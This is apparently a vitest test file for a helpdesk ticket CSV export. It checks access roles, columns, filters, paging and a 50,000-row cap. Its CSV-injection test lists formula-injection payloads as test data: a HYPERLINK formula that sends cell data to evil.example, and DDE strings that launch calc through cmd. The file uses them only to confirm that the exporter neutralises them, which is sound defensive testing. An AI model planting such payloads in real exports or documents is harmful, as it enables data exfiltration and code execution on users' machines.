import { afterAll, beforeEach, describe, expect, it } from "vitest";
import type { Actor } from "@/modules/identity/actor";
import { CSV_BOM } from "@/modules/reporting/csv";
import { countExport, EXPORT_COLUMNS, exportTicketsCsv, MAX_EXPORT_ROWS, type ExportFilters } from "@/modules/reporting/export";
import { allocateTicketNumber, formatReference } from "@/modules/tickets/reference";
import { disconnect, resetDatabase, testPrisma } from "./setup";
import { world } from "../support/world";

const prisma = testPrisma();
const W = world(prisma);
beforeEach(async () => { await resetDatabase(prisma); });
afterAll(async () => { await disconnect(); });

const RANGE: ExportFilters = { from: new Date("2026-03-01T00:00:00Z"), to: new Date("2026-04-01T00:00:00Z") };
const at = (s: string) => new Date(`${s}Z`);

async function csv(a: Actor, f: ExportFilters = RANGE, policy?: object): Promise<string> {
  let out = "";
  for await (const chunk of exportTicketsCsv(prisma, a, f, policy)) out += chunk;
  return out;
}
/** A tiny RFC 4180 parser, independent of the writer, so the test proves the file really round-trips. */
function parse(text: string): string[][] {
  const t = text.replace(/^﻿/, "");
  const rows: string[][] = [];
  let row: string[] = [], cell = "", q = false;
  for (let i = 0; i < t.length; i++) {
    const c = t[i];
    if (q) { if (c === '"') { if (t[i + 1] === '"') { cell += '"'; i++; } else q = false; } else cell += c; }
    else if (c === '"') q = true;
    else if (c === ",") { row.push(cell); cell = ""; }
    else if (c === "\r") { /* skip */ }
    else if (c === "\n") { row.push(cell); rows.push(row); row = []; cell = ""; }
    else cell += c;
  }
  if (cell || row.length) { row.push(cell); rows.push(row); }
  return rows;
}

describe("access", () => {
  it("only managers and admins can export; agents, submitters and employees get 403 (even for their own tickets)", async () => {
    const g = await W.group("Desk");
    const e = await W.actor("employee");
    await W.ticket({ requester: e, group: g.id, createdAt: at("2026-03-05T10:00:00") });
    for (const role of ["employee", "submitter", "agent"] as const) {
      const a = await W.actor(role, [g]);
      await expect(countExport(prisma, a, RANGE), role).rejects.toMatchObject({ status: 403 });
      await expect(csv(a), role).rejects.toMatchObject({ status: 403 });
    }
    expect(parse(await csv(await W.actor("manager"))).length).toBe(2);
    expect(parse(await csv(await W.actor("admin"))).length).toBe(2);
  });

  it("archived tickets are never exported", async () => {
    const e = await W.actor("employee");
    const t = await W.ticket({ requester: e, createdAt: at("2026-03-05T10:00:00") });
    await prisma.ticket.update({ where: { id: t.id }, data: { archivedAt: new Date() } });
    expect(parse(await csv(await W.actor("manager")))).toHaveLength(1); // header only
  });
});

describe("content", () => {
  it("starts with a BOM and the header row, then one row per ticket with the right values", async () => {
    const g = await W.group("Desk");
    const cat = await prisma.category.create({ data: { name: "Network" } });
    const agent = await W.actor("agent", [g], { displayName: "Alan Agent" });
    const req = await W.actor("employee", [], { displayName: "Rita Requester" });
    const t = await W.ticket({ requester: req, group: g.id, assignee: agent, status: "resolved", priority: "p2", subject: "VPN drops", categoryId: cat.id, createdAt: at("2026-03-05T10:00:00"), resolveDueAt: at("2026-03-06T10:00:00"), resolvedAt: at("2026-03-06T09:00:00") });
    const text = await csv(await W.actor("manager"));
    expect(text.startsWith(CSV_BOM)).toBe(true);
    const [header, row] = parse(text);
    expect(header).toEqual([...EXPORT_COLUMNS]);
    const r = Object.fromEntries(header.map((h, i) => [h, row[i]]));
    expect(r).toMatchObject({
      Reference: t.reference, Type: "incident", Status: "resolved", Priority: "p2", Subject: "VPN drops", Category: "Network", Group: "Desk",
      Assignee: "Alan Agent", Requester: "Requester", Channel: "portal", "Created (UTC)": "2026-03-05T10:00:00.000Z", "Resolved (UTC)": "2026-03-06T09:00:00.000Z",
      "Resolution due (UTC)": "2026-03-06T10:00:00.000Z", "Resolution SLA met": "yes", "First response (UTC)": "", "Closed (UTC)": "",
    });
    expect(row).toHaveLength(EXPORT_COLUMNS.length);
  });

  it("the SLA column says no when resolved late, and is empty when there is nothing to measure", async () => {
    const e = await W.actor("employee");
    await W.ticket({ requester: e, status: "resolved", createdAt: at("2026-03-05T10:00:00"), resolveDueAt: at("2026-03-06T10:00:00"), resolvedAt: at("2026-03-06T11:00:00") });
    await W.ticket({ requester: e, status: "new", createdAt: at("2026-03-06T10:00:00"), resolveDueAt: at("2026-03-09T10:00:00") });
    const rows = parse(await csv(await W.actor("manager"))).slice(1).map((r) => r[EXPORT_COLUMNS.indexOf("Resolution SLA met")]);
    expect(rows).toEqual(["no", ""]);
  });

  it("does not contain the description, email addresses or any internal data", async () => {
    const e = await W.actor("employee", [], { mail: "secret.person@example.test" });
    await W.ticket({ requester: e, subject: "Normal", description: "PRIVATE DESCRIPTION TEXT", createdAt: at("2026-03-05T10:00:00") });
    const text = await csv(await W.actor("manager"));
    expect(text).not.toContain("PRIVATE DESCRIPTION");
    expect(text).not.toContain("secret.person@");
  });
});

describe("CSV injection, end to end", () => {
  it("a malicious subject, requester name, group and assignee name cannot execute as formulas, and the file still parses", async () => {
    const evil = [
      '=HYPERLINK("http://evil.example/?x="&A1,"click")', "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)", "\t=1+1", "  =1+1",
    ];
    const g = await W.group("=EVIL-GROUP");
    const agent = await W.actor("agent", [g], { displayName: "@AGENT-NAME" });
    const req = await W.actor("employee");
    let i = 0;
    for (const subject of evil) {
      const t = await W.ticket({ requester: req, group: g.id, assignee: agent, subject, createdAt: new Date(at("2026-03-05T10:00:00").getTime() + i++ * 1000) });
      await prisma.ticket.update({ where: { id: t.id }, data: { requesterName: "+REQUESTER" } });
    }
    const text = await csv(await W.actor("manager"));
    const rows = parse(text).slice(1);
    expect(rows).toHaveLength(evil.length);
    const col = (n: string) => EXPORT_COLUMNS.indexOf(n as never);
    for (const r of rows) {
      expect(r).toHaveLength(EXPORT_COLUMNS.length); // the hostile text did not add or remove columns
      for (const name of ["Subject", "Group", "Assignee", "Requester"]) {
        expect(r[col(name)].startsWith("'"), `${name}: ${r[col(name)]}`).toBe(true);
        expect(/^[=+\-@\t\r]/.test(r[col(name)])).toBe(false); // nothing a spreadsheet would treat as a formula starts the cell
      }
    }
    expect(rows.map((r) => r[col("Subject")]).sort()).toEqual(evil.map((s) => `'${s}`).sort());
  });

  it("quotes, commas and line breaks in a subject survive a round trip without breaking rows", async () => {
    const e = await W.actor("employee");
    const subject = 'Printer "HP-1" jammed, again\nsecond line';
    await W.ticket({ requester: e, subject, createdAt: at("2026-03-05T10:00:00") });
    const rows = parse(await csv(await W.actor("manager")));
    expect(rows).toHaveLength(2);
    expect(rows[1][EXPORT_COLUMNS.indexOf("Subject")]).toBe(subject);
  });

  it("unicode names are intact", async () => {
    const e = await W.actor("employee");
    await W.ticket({ requester: e, subject: "Принтер не печатает 🖨️ 报告", createdAt: at("2026-03-05T10:00:00") });
    expect(parse(await csv(await W.actor("manager")))[1][EXPORT_COLUMNS.indexOf("Subject")]).toBe("Принтер не печатает 🖨️ 报告");
  });
});

describe("filters", () => {
  it("honours the created range (inclusive start, exclusive end), group and status", async () => {
    const g1 = await W.group("Desk");
    const g2 = await W.group("Net");
    const e = await W.actor("employee");
    const mk = (subject: string, over: object) => W.ticket({ requester: e, subject, ...over });
    await mk("in range desk new", { group: g1.id, status: "new", createdAt: at("2026-03-10T00:00:00") });
    await mk("in range net resolved", { group: g2.id, status: "resolved", createdAt: at("2026-03-11T00:00:00") });
    await mk("start edge", { group: g1.id, createdAt: at("2026-03-01T00:00:00") });
    await mk("end edge (excluded)", { group: g1.id, createdAt: at("2026-04-01T00:00:00") });
    await mk("before", { group: g1.id, createdAt: at("2026-02-28T23:59:59") });
    const m = await W.actor("manager");
    const subjects = async (f: ExportFilters) => parse(await csv(m, f)).slice(1).map((r) => r[EXPORT_COLUMNS.indexOf("Subject")]).sort();
    expect(await subjects(RANGE)).toEqual(["in range desk new", "in range net resolved", "start edge"]);
    expect(await subjects({ ...RANGE, groupId: g2.id })).toEqual(["in range net resolved"]);
    expect(await subjects({ ...RANGE, status: "new" })).toEqual(["in range desk new", "start edge"]);
    expect(await subjects({ ...RANGE, groupId: g1.id, status: "resolved" })).toEqual([]);
  });
});

describe("size: paging and the 50,000-row cap", () => {
  it("streams more than one page (2,300 rows) completely, in order, with no duplicates or gaps", async () => {
    const e = await W.actor("employee");
    const rows = [];
    for (let i = 0; i < 2300; i++) {
      const number = await allocateTicketNumber(prisma);
      rows.push({ number, reference: formatReference("incident", number), type: "incident" as const, channel: "portal" as const, subject: `bulk ${i}`, description: "d", impact: "medium" as const, urgency: "medium" as const, priority: "p3" as const, requesterName: "R", requesterEmployeeId: e.employeeId, createdByEmployeeId: e.employeeId, createdAt: at("2026-03-05T10:00:00") });
    }
    await prisma.ticket.createMany({ data: rows });
    const m = await W.actor("manager");
    expect(await countExport(prisma, m, RANGE)).toBe(2300);
    const chunks: string[] = [];
    for await (const c of exportTicketsCsv(prisma, m, RANGE)) chunks.push(c);
    expect(chunks.length).toBeGreaterThanOrEqual(4); // header + 3 pages: it really is streamed in pages
    const parsed = parse(chunks.join("")).slice(1);
    expect(parsed).toHaveLength(2300);
    const refs = parsed.map((r) => r[0]);
    expect(new Set(refs).size).toBe(2300);
    expect(refs).toEqual([...refs].sort()); // ticket-number order
  });

  it("refuses an export over the cap before sending anything (422 EXPORT_TOO_LARGE)", async () => {
    const m = await W.actor("manager");
    const fake = { ticket: { count: async () => MAX_EXPORT_ROWS + 1, findMany: async () => { throw new Error("must not be read"); } } } as never;
    await expect(countExport(fake, m, RANGE)).rejects.toMatchObject({ status: 422, code: "EXPORT_TOO_LARGE" });
    const exactly = { ticket: { count: async () => MAX_EXPORT_ROWS } } as never;
    await expect(countExport(exactly, m, RANGE)).resolves.toBe(MAX_EXPORT_ROWS);
    expect(MAX_EXPORT_ROWS).toBe(50_000);
  });

  it("the generator itself never emits more than the cap even if the data grew after the count", async () => {
    const m = await W.actor("manager");
    let served = 0;
    const endless = { ticket: { findMany: async ({ take }: { take: number }) => Array.from({ length: take }, () => ({ number: BigInt(++served), reference: "INC", type: "incident", status: "new", priority: "p3", subject: "s", channel: "portal", createdAt: new Date(), firstRespondedAt: null, resolvedAt: null, closedAt: null, responseDueAt: null, resolveDueAt: null, requesterName: "r", category: null, assignmentGroup: null, assignee: null, createdBy: { displayName: "c" } })) } } as never;
    let rows = 0;
    for await (const c of exportTicketsCsv(endless, m, RANGE)) rows += (c.match(/\r\n/g) ?? []).length;
    expect(rows - 1).toBe(MAX_EXPORT_ROWS); // minus the header line
  });
});
